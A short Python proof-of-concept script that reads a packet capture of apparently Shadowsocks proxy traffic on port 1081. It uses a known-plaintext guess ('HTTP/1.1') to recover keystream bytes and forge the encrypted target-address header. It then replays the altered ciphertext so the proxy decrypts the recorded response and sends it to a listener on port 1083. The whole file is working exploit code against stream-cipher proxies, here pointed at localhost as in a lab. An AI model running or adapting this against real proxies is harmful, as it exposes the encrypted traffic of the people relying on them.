from scapy.packet import Raw
from scapy.all import rdpcap
import socket
import struct
import time

packets = rdpcap("ss_ip_direct.pcapng")
pkg_send, pkg_recv = None, None

for p in packets:
    if p['TCP'] and p['TCP'].dport == 1081 and isinstance(p['TCP'].payload, Raw):
        pkg_send = p
    if p['TCP'] and p['TCP'].sport == 1081 and isinstance(p['TCP'].payload, Raw):
        pkg_recv = p

send_iv, send_data = pkg_send['TCP'].payload.load[:16], pkg_send['TCP'].payload.load[16:]
recv_iv, recv_data = pkg_recv['TCP'].payload.load[:16], pkg_recv['TCP'].payload.load[16:]

predict_data = b"HTTP/1.1"
predict_xor_key = bytes([(predict_data[i] ^ recv_data[i]) for i in range(len(predict_data))])

target_ip = "127.0.0.1"
target_port = 1083
fake_header = b'\x01' + socket.inet_pton(socket.AF_INET, target_ip) + bytes(struct.pack('>H', target_port))
fake_header = bytes([(fake_header[i] ^ predict_xor_key[i]) for i in range(len(fake_header))])
fake_data = recv_iv + fake_header + recv_data[len(fake_header):]
print(fake_data.hex())

s = socket.socket()
s.connect(("127.0.0.1", 1081))
s.send(fake_data)
print('Tcp sending... ')
time.sleep(3)
s.close()
